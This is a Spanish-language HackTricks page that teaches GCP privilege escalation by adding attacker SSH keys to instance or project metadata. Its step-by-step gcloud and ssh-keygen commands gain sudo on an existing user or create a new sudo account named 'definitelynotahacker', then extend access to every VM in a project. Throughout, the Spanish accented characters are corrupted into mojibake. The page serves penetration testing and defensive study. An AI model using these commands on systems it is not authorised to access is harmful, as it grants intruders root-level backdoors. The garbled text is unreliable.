# GCP - Agregar Metadatos SSH Personalizados

## GCP - Agregar Metadatos SSH Personalizados

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

</details>
{% endhint %}

### Modificando los metadatos <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

La modificaci칩n de metadatos en una instancia podr칤a llevar a **riesgos de seguridad significativos si un atacante obtiene los permisos necesarios**.

#### **Incorporaci칩n de Claves SSH en Metadatos Personalizados**

En GCP, **los sistemas Linux** a menudo ejecutan scripts desde el [Entorno de Invitado de Python para Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Un componente cr칤tico de esto es el [demonio de cuentas](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), que est치 dise침ado para **verificar regularmente** el punto final de metadatos de la instancia en busca de **actualizaciones a las claves p칰blicas SSH autorizadas**.

Por lo tanto, si un atacante puede modificar los metadatos personalizados, podr칤a hacer que el demonio encuentre una nueva clave p칰blica, que ser치 procesada e **integrada en el sistema local**. La clave se a침adir치 al archivo `~/.ssh/authorized_keys` de un **usuario existente o potencialmente creando un nuevo usuario con privilegios `sudo`**, dependiendo del formato de la clave. Y el atacante podr치 comprometer el host.

#### **Agregar clave SSH a un usuario privilegiado existente**

1. **Examinar Claves SSH Existentes en la Instancia:**
*   Ejecuta el comando para describir la instancia y sus metadatos para localizar las claves SSH existentes. La secci칩n relevante en la salida estar치 bajo `metadata`, espec칤ficamente la clave `ssh-keys`.

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
* Presta atenci칩n al formato de las claves SSH: el nombre de usuario precede a la clave, separado por dos puntos.
2. **Preparar un Archivo de Texto para Metadatos de Clave SSH:**
* Guarda los detalles de los nombres de usuario y sus correspondientes claves SSH en un archivo de texto llamado `meta.txt`. Esto es esencial para preservar las claves existentes mientras se a침aden nuevas.
3. **Generar una Nueva Clave SSH para el Usuario Objetivo (`alice` en este ejemplo):**
*   Usa el comando `ssh-keygen` para generar una nueva clave SSH, asegur치ndote de que el campo de comentario (`-C`) coincida con el nombre de usuario objetivo.

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
* A침ade la nueva clave p칰blica a `meta.txt`, imitando el formato encontrado en los metadatos de la instancia.
4. **Actualizar los Metadatos de Clave SSH de la Instancia:**
*   Aplica los metadatos de clave SSH actualizados a la instancia usando el comando `gcloud compute instances add-metadata`.

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
5. **Acceder a la Instancia Usando la Nueva Clave SSH:**
*   Con칠ctate a la instancia con SSH usando la nueva clave, accediendo a la shell en el contexto del usuario objetivo (`alice` en este ejemplo).

```bash
ssh -i ./key alice@localhost
sudo id
```

#### **Crear un nuevo usuario privilegiado y agregar una clave SSH**

Si no se encuentra un usuario interesante, es posible crear uno nuevo que se le otorgar치n privilegios `sudo`:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
#### Claves SSH a nivel de proyecto <a href="#sshing-around" id="sshing-around"></a>

Es posible ampliar el alcance del acceso SSH a m칰ltiples M치quinas Virtuales (VMs) en un entorno de nube al **aplicar claves SSH a nivel de proyecto**. Este enfoque permite el acceso SSH a cualquier instancia dentro del proyecto que no haya bloqueado expl칤citamente las claves SSH a nivel de proyecto. Aqu칤 hay una gu칤a resumida:

1. **Aplicar Claves SSH a Nivel de Proyecto:**
*   Utiliza el comando `gcloud compute project-info add-metadata` para agregar claves SSH desde `meta.txt` a los metadatos del proyecto. Esta acci칩n asegura que las claves SSH sean reconocidas en todas las VMs del proyecto, a menos que una VM tenga habilitada la opci칩n "Bloquear claves SSH a nivel de proyecto".

```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
2. **SSH en Instancias Usando Claves a Nivel de Proyecto:**
* Con las claves SSH a nivel de proyecto en su lugar, puedes SSH en cualquier instancia dentro del proyecto. Las instancias que no bloquean las claves a nivel de proyecto aceptar치n la clave SSH, otorgando acceso.
* Un m칠todo directo para SSH en una instancia es usar el comando `gcloud compute ssh [INSTANCE]`. Este comando utiliza tu nombre de usuario actual y las claves SSH establecidas a nivel de proyecto para intentar el acceso.

## Referencias

* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
